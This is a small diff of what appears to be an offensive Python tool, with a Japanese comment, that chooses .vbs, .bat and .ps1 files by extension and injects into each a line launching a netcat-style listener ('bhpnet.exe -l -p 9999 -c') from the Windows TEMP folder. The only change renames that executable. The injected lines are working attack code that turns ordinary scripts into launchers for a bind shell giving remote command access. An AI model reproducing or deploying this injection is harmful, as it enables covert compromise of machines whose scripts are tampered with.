@@ -19,7 +19,7 @@ FILE_RENAMED_TO   = 5
 
 # 拡張子ベースでインジェクションする対象を選択する
 file_types         = {}
-command = "C:\\WINDOWS\\TEMP\\bhpnet.exe –l –p 9999 –c"
+command = "C:\\WINDOWS\\TEMP\\bhnet.exe –l –p 9999 –c"
 file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
 file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
 file_types['.ps1'] = ["\r\n#bhpmarker","Start-Process \"%s\"" % command]
